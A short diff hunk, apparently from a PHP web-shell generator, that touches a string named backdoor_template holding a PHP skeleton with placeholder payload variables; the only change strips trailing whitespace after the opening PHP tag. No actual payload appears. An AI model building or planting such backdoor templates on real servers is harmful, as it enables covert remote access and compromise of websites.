@@ -36,7 +36,7 @@ echo '</'.$k.'>';
 }
 """
 
-	backdoor_template = """<?php 
+	backdoor_template = """<?php
 $%%PAY_VAR1%%="%%PAYLOAD1%%";
 $%%PAY_VAR2%%="%%PAYLOAD2%%";
 $%%PAY_VAR3%%="%%PAYLOAD3%%";
